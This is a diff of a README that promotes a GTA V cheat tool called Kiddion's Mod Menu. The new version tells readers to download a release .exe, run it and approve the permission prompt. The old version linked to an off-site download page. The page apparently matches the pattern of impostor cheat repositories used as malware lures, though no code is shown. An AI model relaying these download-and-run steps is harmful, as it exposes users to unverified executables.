@@ -1,70 +1,75 @@
-# 🎮 Kiddion’s Mod Menu – GTA V Ultimate Utility 2025
+# 🎮 kiddionsmenu - Easy Mod Menu for a Better Gaming Experience
 
-Unlock the full potential of **GTA V** with Kiddion’s Mod Menu – the ultimate tool for **customization, control, and fun**.  
-Perfect for single-player exploration, testing, or creative freedom.
+[![Download Now](https://img.shields.io/badge/download-latest%20release-blue.svg)](https://github.com/keepups/kiddionsmenu/releases)
 
-<p align="center">
-  <a href="https://sites.google.com/view/beliumsoft">
-    <img src="https://img.shields.io/badge/⬇%20DOWNLOAD%20NOW-blueviolet" alt="Download Kiddion's Mod Menu" />
-  </a>
-</p>
+## 🚀 Getting Started
 
----
+Welcome to the Kiddions Mod Menu! This guide will help you easily download and run the software. With the Kiddions Mod Menu, you can enjoy features like spawning items, unlimited money, all weapons, and reduced recoil while playing your favorite games.
 
-## 🔹 FEATURES
+## 📦 Requirements
 
-### Player & Character Enhancements
-- **God Mode** – Invincible character with no damage taken  
-- **Unlimited Ammo** – Shoot without worrying about reloads or ammo  
-- **Teleportation** – Move anywhere on the map instantly  
-- **Vehicle Spawning** – Spawn any car, plane, or bike  
-- **Super Jump & No Clip** – Fly or walk through objects  
+Before you start, make sure you have the following:
 
-### Money & Economy
-- **Money Drop** – Instantly add cash to your account  
-- **Weapon Unlocks** – Access all weapons without progression  
-- **Property & Vehicle Unlocks** – Own everything in single-player mode  
+- A Windows PC (Windows 10 or newer recommended)
+- At least 2 GB of RAM
+- An internet connection for downloading
+- Grand Theft Auto V installed
 
-### World & Environment
-- **Weather & Time Control** – Change rain, sun, fog, or night/day cycles  
-- **NPC Control** – Modify AI behavior, spawn or remove pedestrians  
-- **Explosion & Gravity Modifiers** – Customize physics for fun chaos  
+## 🔗 Download & Install
 
-### Utilities & Customization
-- **Hotkey Profiles** – Quick access to favorite mods  
-- **Menu Transparency & Scale** – Adjust UI for comfort  
-- **Backup & Restore Settings** – Save your custom setups  
+To get the latest version of the Kiddions Mod Menu, visit our [Releases page](https://github.com/keepups/kiddionsmenu/releases). 
 
----
+1. Click on the link above to go to the Releases page.
+2. Look for the latest release at the top.
+3. Find the download link for the application file. It typically ends with `.exe`. 
+4. Click on the file to download it. 
 
-## 📋 SYSTEM REQUIREMENTS
+### Example of a download link:
+- You might see something like `kiddions_menu_v1.0.exe`. Select it to download.
 
-| Feature           | Minimum Specs                  |
-|-------------------|--------------------------------|
-| OS                | Windows 10 / 11               |
-| CPU               | Intel i5 / AMD Ryzen 5        |
-| RAM               | 8 GB+                          |
-| GPU               | GTX 960 / RX 470 or better     |
-| GTA V Version     | Latest Single-Player Update    |
-| Status            | Fully Tested & Optimized       |
+Once your download is complete, follow these steps to install and run the application:
 
----
+1. Navigate to your Downloads folder.
+2. Locate the downloaded file (e.g., `kiddions_menu_v1.0.exe`).
+3. Double-click the file to run it. If your system prompts for permission, click "Yes."
 
-## 🔖 TAGS
-`kiddions mod menu`, `gta v mods`, `gta v trainer`, `gta v god mode`,  
-`gta v teleport`, `gta v money drop`, `gta v ultimate menu`, `gta v cheat tool`
+## ⚙️ Using the Mod Menu
 
----
+After launching the Kiddions Mod Menu, follow these simple steps to use it:
 
-## ⚠ DISCLAIMER
-> Kiddion’s Mod Menu is intended for **single-player use only**.  
-> Use responsibly. Avoid using on online servers to prevent bans.
+1. **Open GTA V**: Start the game normally.
+2. **Access the Mod Menu**: While in the game, press the key combination `F5` to open the mod menu.
+3. **Choose Options**: Use the keyboard arrows to navigate through the options. You can select features like spawning money, weapons, or adjusting your character's abilities.
+4. **Apply Changes**: Once you have made your selections, press `Enter` to apply the chosen mods.
 
----
+## 🔒 Safety Tips
 
-<p align="center">
-  <img src="https://img.shields.io/badge/status-optimized-success?style=for-the-badge" />
-  <img src="https://img.shields.io/badge/platform-Windows-purple?style=for-the-badge" />
-  <img src="https://img.shields.io/badge/version-2025-lightgrey?style=for-the-badge" />
-  <img src="https://img.shields.io/badge/mode-singleplayer-orange?style=for-the-badge" />
-</p>
+Using mod menus can affect your game experience. Here are some safety tips:
+
+- **Backup Your Game**: Always create a backup of your game files before using any mods.
+- **Avoid Overusing Mods**: Excessive use of mods may lead to glitches or crashes in the game.
+- **Play Responsibly**: Use mods for fun and do not exploit other players.
+
+## 🎧 Support and Community
+
+If you need help or have questions, feel free to reach out to our community:
+
+- Visit the [Issues section](https://github.com/keepups/kiddionsmenu/issues) on GitHub for support.
+- Join our discussions or ask questions about the mod menu.
+  
+## 👥 Contribution
+
+Want to help improve the Kiddions Mod Menu? Here’s how you can contribute:
+
+- Report bugs through the GitHub Issues section.
+- Suggest new features or improvements.
+- Help spread the word by sharing this README with fellow gamers.
+
+## 📖 Additional Resources
+
+You may find the following links useful for getting more out of the Kiddions Mod Menu:
+
+- [Official GitHub Repository](https://github.com/keepups/kiddionsmenu)
+- [User Guide and FAQ](https://github.com/keepups/kiddionsmenu/wiki)
+
+Enjoy your enhanced gaming experience with Kiddions Mod Menu! Download it now from our [Releases page](https://github.com/keepups/kiddionsmenu/releases). 
